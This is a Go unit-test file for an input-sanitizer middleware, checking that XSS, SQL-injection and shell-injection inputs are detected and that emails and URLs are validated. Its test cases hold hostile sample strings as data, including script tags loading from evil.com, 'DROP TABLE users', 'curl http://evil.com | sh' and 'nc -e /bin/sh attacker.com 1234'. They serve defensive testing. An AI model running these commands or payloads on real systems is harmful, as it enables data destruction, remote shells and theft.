// Phase: phase-01 | Task: 18 | Architecture: ARCH-013 | Design: InputSanitizer

package middleware

import (
	"log"
	"testing"
)

func TestBlockXSSPatterns(t *testing.T) {
	sanitizer := NewSanitizer(DefaultConfig(), log.Default())

	tests := []struct {
		name      string
		input     string
		wantDet   bool
		wantClean string
	}{
		{
			name:      "script tag",
			input:     "<script>alert('xss')</script>",
			wantDet:   true,
			wantClean: "",
		},
		{
			name:      "script tag with attributes",
			input:     "<script src=\"http://evil.com/script.js\"></script>",
			wantDet:   true,
			wantClean: "",
		},
		{
			name:      "javascript protocol",
			input:     "javascript:alert('xss')",
			wantDet:   true,
			wantClean: "",
		},
		{
			name:      "onclick handler",
			input:     "<img src=\"x\" onClick=\"alert('xss')\">",
			wantDet:   true,
			wantClean: "<img src=\"x\" >",
		},
		{
			name:      "onload handler",
			input:     "<body onload=\"evil()\">",
			wantDet:   true,
			wantClean: "<body >",
		},
		{
			name:      "iframe",
			input:     "<iframe src=\"http://evil.com\"></iframe>",
			wantDet:   true,
			wantClean: "",
		},
		{
			name:      "object tag",
			input:     "<object data=\"http://evil.com/evil.swf\"></object>",
			wantDet:   true,
			wantClean: "",
		},
		{
			name:      "embed tag",
			input:     "<embed src=\"http://evil.com/evil.swf\">",
			wantDet:   true,
			wantClean: "",
		},
		{
			name:      "svg tag",
			input:     "<svg onload=\"alert(1)\">",
			wantDet:   true,
			wantClean: "<svg >",
		},
		{
			name:      "data text/html",
			input:     "data:text/html,<script>alert('xss')</script>",
			wantDet:   true,
			wantClean: "",
		},
		{
			name:      "expression",
			input:     "expression(alert('xss'))",
			wantDet:   true,
			wantClean: "",
		},
		{
			name:      "meta http-equiv",
			input:     "<meta http-equiv=\"refresh\" content=\"0;url=http://evil.com\">",
			wantDet:   true,
			wantClean: "",
		},
		{
			name:      "link tag",
			input:     "<link rel=\"stylesheet\" href=\"http://evil.com/evil.css\">",
			wantDet:   true,
			wantClean: "",
		},
		{
			name:      "safe content",
			input:     "Hello, this is safe content!",
			wantDet:   false,
			wantClean: "Hello, this is safe content!",
		},
		{
			name:      "HTML encoded script",
			input:     "&lt;script&gt;alert('xss')&lt;/script&gt;",
			wantDet:   true,
			wantClean: "",
		},
		{
			name:      "numeric entity",
			input:     "&#60;script&gt;alert('xss')&#60;/script&gt;",
			wantDet:   true,
			wantClean: "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, detected := sanitizer.BlockXSSPatterns(tt.input)
			if detected != tt.wantDet {
				t.Errorf("BlockXSSPatterns() detected = %v, want %v", detected, tt.wantDet)
			}
			if got != tt.wantClean {
				t.Errorf("BlockXSSPatterns() got = %v, want %v", got, tt.wantClean)
			}
		})
	}
}

func TestBlockSQLInjection(t *testing.T) {
	sanitizer := NewSanitizer(DefaultConfig(), log.Default())

	tests := []struct {
		name    string
		input   string
		wantDet bool
	}{
		{
			name:    "UNION SELECT",
			input:   "1' UNION SELECT password FROM users--",
			wantDet: true,
		},
		{
			name:    "SELECT statement",
			input:   "SELECT * FROM users WHERE id=1",
			wantDet: true,
		},
		{
			name:    "INSERT statement",
			input:   "INSERT INTO users VALUES('hacker')",
			wantDet: true,
		},
		{
			name:    "UPDATE statement",
			input:   "UPDATE users SET password='evil'",
			wantDet: true,
		},
		{
			name:    "DELETE statement",
			input:   "DELETE FROM users WHERE 1=1",
			wantDet: true,
		},
		{
			name:    "DROP TABLE",
			input:   "DROP TABLE users",
			wantDet: true,
		},
		{
			name:    "TRUNCATE TABLE",
			input:   "TRUNCATE TABLE users",
			wantDet: true,
		},
		{
			name:    "ALTER TABLE",
			input:   "ALTER TABLE users ADD COLUMN hack VARCHAR(255)",
			wantDet: true,
		},
		{
			name:    "SQL comment",
			input:   "1' OR 1=1 --",
			wantDet: true,
		},
		{
			name:    "block comment",
			input:   "1 /* comment */ OR 1=1",
			wantDet: true,
		},
		{
			name:    "OR 1=1",
			input:   "' OR '1'='1",
			wantDet: true,
		},
		{
			name:    "AND 1=1",
			input:   "' AND '1'='1",
			wantDet: true,
		},
		{
			name:    "SLEEP injection",
			input:   "1' AND SLEEP(5)--",
			wantDet: true,
		},
		{
			name:    "BENCHMARK injection",
			input:   "1' AND BENCHMARK(1000000,SHA1(1))--",
			wantDet: true,
		},
		{
			name:    "information_schema",
			input:   "SELECT * FROM information_schema.tables",
			wantDet: true,
		},
		{
			name:    "EXEC stored procedure",
			input:   "EXEC xp_cmdshell 'dir'",
			wantDet: true,
		},
		{
			name:    "safe input",
			input:   "John Doe",
			wantDet: false,
		},
		{
			name:    "numeric input",
			input:   "12345",
			wantDet: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, detected := sanitizer.BlockSQLInjection(tt.input)
			if detected != tt.wantDet {
				t.Errorf("BlockSQLInjection() detected = %v, want %v", detected, tt.wantDet)
			}
		})
	}
}

func TestBlockShellInjection(t *testing.T) {
	sanitizer := NewSanitizer(DefaultConfig(), log.Default())

	tests := []struct {
		name    string
		input   string
		wantDet bool
	}{
		{
			name:    "rm command",
			input:   "rm -rf /",
			wantDet: true,
		},
		{
			name:    "del command",
			input:   "del C:\\Windows\\System32",
			wantDet: true,
		},
		{
			name:    "wget command",
			input:   "wget http://evil.com/malware",
			wantDet: true,
		},
		{
			name:    "curl command",
			input:   "curl http://evil.com | sh",
			wantDet: true,
		},
		{
			name:    "netcat",
			input:   "nc -e /bin/sh attacker.com 1234",
			wantDet: true,
		},
		{
			name:    "bash shell",
			input:   "bash -c 'cat /etc/passwd'",
			wantDet: true,
		},
		{
			name:    "sudo command",
			input:   "sudo rm -rf /",
			wantDet: true,
		},
		{
			name:    "su command",
			input:   "su - root",
			wantDet: true,
		},
		{
			name:    "safe input",
			input:   "file.txt",
			wantDet: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, detected := sanitizer.BlockShellInjection(tt.input)
			if detected != tt.wantDet {
				t.Errorf("BlockShellInjection() detected = %v, want %v", detected, tt.wantDet)
			}
		})
	}
}

func TestSanitizeString(t *testing.T) {
	sanitizer := NewSanitizer(DefaultConfig(), log.Default())

	tests := []struct {
		name       string
		input      string
		allowHTML  bool
		wantErrors int
		wantSanitz bool
	}{
		{
			name:       "normal string",
			input:      "Hello World",
			allowHTML:  false,
			wantErrors: 0,
			wantSanitz: false,
		},
		{
			name:       "XSS in string",
			input:      "<script>alert('xss')</script>",
			allowHTML:  false,
			wantErrors: 0,
			wantSanitz: true,
		},
		{
			name:       "SQL injection",
			input:      "1' OR '1'='1",
			allowHTML:  false,
			wantErrors: 0,
			wantSanitz: true,
		},
		{
			name:       "null bytes stripped",
			input:      "test\x00value",
			allowHTML:  false,
			wantErrors: 0,
			wantSanitz: true,
		},
		{
			name:       "input too long",
			input:      "a",
			allowHTML:  false,
			wantErrors: 1,
			wantSanitz: false,
		},
	}

	config := SanitizationConfig{
		MaxInputLength: 1,
		StripNullBytes: true,
		EscapeSQL:      true,
		EscapeShell:    true,
	}
	longInputSanitizer := NewSanitizer(config, log.Default())

	tests[4].input = "ab"

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var s *Sanitizer
			if tt.name == "input too long" {
				s = longInputSanitizer
			} else {
				s = sanitizer
			}

			got, errors := s.SanitizeString(tt.input, tt.allowHTML)
			if len(errors) != tt.wantErrors {
				t.Errorf("SanitizeString() errors = %v, want %v", len(errors), tt.wantErrors)
			}
			if (got != tt.input) != tt.wantSanitz {
				t.Errorf("SanitizeString() sanitized = %v, want %v", got != tt.input, tt.wantSanitz)
			}
		})
	}
}

func TestSanitizeNumber(t *testing.T) {
	sanitizer := NewSanitizer(DefaultConfig(), log.Default())

	minVal := float64(0)
	maxVal := float64(100)

	tests := []struct {
		name       string
		input      interface{}
		min        *float64
		max        *float64
		wantErrors int
		wantValue  float64
	}{
		{
			name:       "valid float64",
			input:      float64(42.5),
			min:        nil,
			max:        nil,
			wantErrors: 0,
			wantValue:  42.5,
		},
		{
			name:       "valid int",
			input:      int(42),
			min:        nil,
			max:        nil,
			wantErrors: 0,
			wantValue:  42,
		},
		{
			name:       "valid string",
			input:      "42.5",
			min:        nil,
			max:        nil,
			wantErrors: 0,
			wantValue:  42.5,
		},
		{
			name:       "below minimum",
			input:      float64(-5),
			min:        &minVal,
			max:        nil,
			wantErrors: 1,
			wantValue:  -5,
		},
		{
			name:       "above maximum",
			input:      float64(150),
			min:        nil,
			max:        &maxVal,
			wantErrors: 1,
			wantValue:  150,
		},
		{
			name:       "infinity",
			input:      "inf",
			min:        nil,
			max:        nil,
			wantErrors: 1,
			wantValue:  0,
		},
		{
			name:       "NaN",
			input:      "nan",
			min:        nil,
			max:        nil,
			wantErrors: 1,
			wantValue:  0,
		},
		{
			name:       "invalid type",
			input:      []string{"invalid"},
			min:        nil,
			max:        nil,
			wantErrors: 1,
			wantValue:  0,
		},
		{
			name:       "invalid string",
			input:      "not-a-number",
			min:        nil,
			max:        nil,
			wantErrors: 1,
			wantValue:  0,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, errors := sanitizer.SanitizeNumber(tt.input, tt.min, tt.max)
			if len(errors) != tt.wantErrors {
				t.Errorf("SanitizeNumber() errors = %v, want %v", len(errors), tt.wantErrors)
			}
			if got != tt.wantValue && !(len(errors) > 0) {
				t.Errorf("SanitizeNumber() got = %v, want %v", got, tt.wantValue)
			}
		})
	}
}

func TestValidateEmail(t *testing.T) {
	sanitizer := NewSanitizer(DefaultConfig(), log.Default())

	tests := []struct {
		name    string
		input   string
		wantVal bool
	}{
		{
			name:    "valid email",
			input:   "test@example.com",
			wantVal: true,
		},
		{
			name:    "valid email with subdomain",
			input:   "user@mail.example.com",
			wantVal: true,
		},
		{
			name:    "valid email with plus",
			input:   "test+tag@example.com",
			wantVal: true,
		},
		{
			name:    "invalid email no @",
			input:   "testexample.com",
			wantVal: false,
		},
		{
			name:    "invalid email no domain",
			input:   "test@",
			wantVal: false,
		},
		{
			name:    "invalid email no local part",
			input:   "@example.com",
			wantVal: false,
		},
		{
			name:    "email with XSS",
			input:   "test<script>alert('xss')</script>@example.com",
			wantVal: false,
		},
		{
			name:    "email with SQL injection",
			input:   "test' OR '1'='1@example.com",
			wantVal: false,
		},
		{
			name:    "empty email",
			input:   "",
			wantVal: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, _ := sanitizer.ValidateEmail(tt.input)
			if got != tt.wantVal {
				t.Errorf("ValidateEmail() = %v, want %v", got, tt.wantVal)
			}
		})
	}
}

func TestValidateURL(t *testing.T) {
	sanitizer := NewSanitizer(DefaultConfig(), log.Default())

	tests := []struct {
		name    string
		input   string
		wantVal bool
	}{
		{
			name:    "valid HTTP URL",
			input:   "http://example.com",
			wantVal: true,
		},
		{
			name:    "valid HTTPS URL",
			input:   "https://example.com/path",
			wantVal: true,
		},
		{
			name:    "valid URL with query",
			input:   "https://example.com/path?query=value",
			wantVal: true,
		},
		{
			name:    "javascript protocol",
			input:   "javascript:alert('xss')",
			wantVal: false,
		},
		{
			name:    "data protocol",
			input:   "data:text/html,<script>alert('xss')</script>",
			wantVal: false,
		},
		{
			name:    "vbscript protocol",
			input:   "vbscript:msgbox('xss')",
			wantVal: false,
		},
		{
			name:    "invalid URL no protocol",
			input:   "example.com",
			wantVal: false,
		},
		{
			name:    "empty URL",
			input:   "",
			wantVal: false,
		},
		{
			name:    "URL too long",
			input:   "http://example.com/" + string(make([]byte, 2049)),
			wantVal: false,
		},
		{
			name:    "URL with XSS",
			input:   "http://example.com/<script>alert('xss')</script>",
			wantVal: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got, _ := sanitizer.ValidateURL(tt.input)
			if got != tt.wantVal {
				t.Errorf("ValidateURL() = %v, want %v", got, tt.wantVal)
			}
		})
	}
}

func TestSanitizeArray(t *testing.T) {
	sanitizer := NewSanitizer(DefaultConfig(), log.Default())

	input := []interface{}{"<script>alert('xss')</script>", "normal string", "1' OR '1'='1"}
	got, errors := sanitizer.SanitizeArray(input, InputTypeString)

	if len(errors) != 0 {
		t.Errorf("SanitizeArray() unexpected errors: %v", errors)
	}

	if len(got) != 3 {
		t.Errorf("SanitizeArray() length = %v, want 3", len(got))
	}

	if got[0] != "" {
		t.Errorf("SanitizeArray()[0] = %v, want empty", got[0])
	}
}

func TestSanitizeObject(t *testing.T) {
	sanitizer := NewSanitizer(DefaultConfig(), log.Default())

	input := map[string]interface{}{
		"name":  "<script>alert('xss')</script>",
		"email": "test@example.com",
		"age":   float64(25),
	}

	rules := map[string]ValidationRule{
		"name": {
			InputType: InputTypeString,
			Required:  true,
		},
		"email": {
			InputType: InputTypeEmail,
			Required:  true,
		},
	}

	got, errors := sanitizer.SanitizeObject(input, rules)

	if len(errors) > 0 {
		t.Errorf("SanitizeObject() unexpected errors: %v", errors)
	}

	if got["name"] != "" {
		t.Errorf("SanitizeObject()[name] = %v, want empty", got["name"])
	}
}

func TestSanitize(t *testing.T) {
	sanitizer := NewSanitizer(DefaultConfig(), log.Default())

	tests := []struct {
		name      string
		input     interface{}
		inputType InputType
		wantValid bool
	}{
		{
			name:      "string type",
			input:     "hello",
			inputType: InputTypeString,
			wantValid: true,
		},
		{
			name:      "number type",
			input:     float64(42),
			inputType: InputTypeNumber,
			wantValid: true,
		},
		{
			name:      "bool true",
			input:     true,
			inputType: InputTypeBool,
			wantValid: true,
		},
		{
			name:      "bool string true",
			input:     "true",
			inputType: InputTypeBool,
			wantValid: true,
		},
		{
			name:      "bool string 1",
			input:     "1",
			inputType: InputTypeBool,
			wantValid: true,
		},
		{
			name:      "bool string yes",
			input:     "yes",
			inputType: InputTypeBool,
			wantValid: true,
		},
		{
			name:      "array type",
			input:     []interface{}{"a", "b"},
			inputType: InputTypeArray,
			wantValid: true,
		},
		{
			name:      "object type",
			input:     map[string]interface{}{"key": "value"},
			inputType: InputTypeObject,
			wantValid: true,
		},
		{
			name:      "email type valid",
			input:     "test@example.com",
			inputType: InputTypeEmail,
			wantValid: true,
		},
		{
			name:      "email type invalid",
			input:     "invalid-email",
			inputType: InputTypeEmail,
			wantValid: false,
		},
		{
			name:      "url type valid",
			input:     "https://example.com",
			inputType: InputTypeURL,
			wantValid: true,
		},
		{
			name:      "url type invalid",
			input:     "not-a-url",
			inputType: InputTypeURL,
			wantValid: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := sanitizer.Sanitize(tt.input, tt.inputType, "test_field")
			if got.IsValid != tt.wantValid {
				t.Errorf("Sanitize().IsValid = %v, want %v", got.IsValid, tt.wantValid)
			}
		})
	}
}

func TestDefaultConfig(t *testing.T) {
	config := DefaultConfig()

	if config.AllowHTML != false {
		t.Errorf("DefaultConfig().AllowHTML = %v, want false", config.AllowHTML)
	}
	if config.MaxInputLength != 10000 {
		t.Errorf("DefaultConfig().MaxInputLength = %v, want 10000", config.MaxInputLength)
	}
	if config.StripNullBytes != true {
		t.Errorf("DefaultConfig().StripNullBytes = %v, want true", config.StripNullBytes)
	}
	if config.EscapeSQL != true {
		t.Errorf("DefaultConfig().EscapeSQL = %v, want true", config.EscapeSQL)
	}
	if config.EscapeShell != true {
		t.Errorf("DefaultConfig().EscapeShell = %v, want true", config.EscapeShell)
	}
}

func TestStrictConfig(t *testing.T) {
	config := StrictConfig()

	if config.MaxInputLength != 1000 {
		t.Errorf("StrictConfig().MaxInputLength = %v, want 1000", config.MaxInputLength)
	}
}

func TestHTMLPermissiveConfig(t *testing.T) {
	allowedTags := []string{"p", "br", "b"}
	allowedAttrs := map[string][]string{"href": {"http", "https"}}

	config := HTMLPermissiveConfig(allowedTags, allowedAttrs)

	if config.AllowHTML != true {
		t.Errorf("HTMLPermissiveConfig().AllowHTML = %v, want true", config.AllowHTML)
	}
	if len(config.AllowedTags) != 3 {
		t.Errorf("HTMLPermissiveConfig().AllowedTags length = %v, want 3", len(config.AllowedTags))
	}
}

func TestSanitizeShellMetacharacters(t *testing.T) {
	sanitizer := NewSanitizer(DefaultConfig(), log.Default())

	input := "echo hello; ls -la && pwd"
	_, detected := sanitizer.BlockShellInjection(input)

	if !detected {
		t.Error("Shell metacharacters should be detected")
	}
}
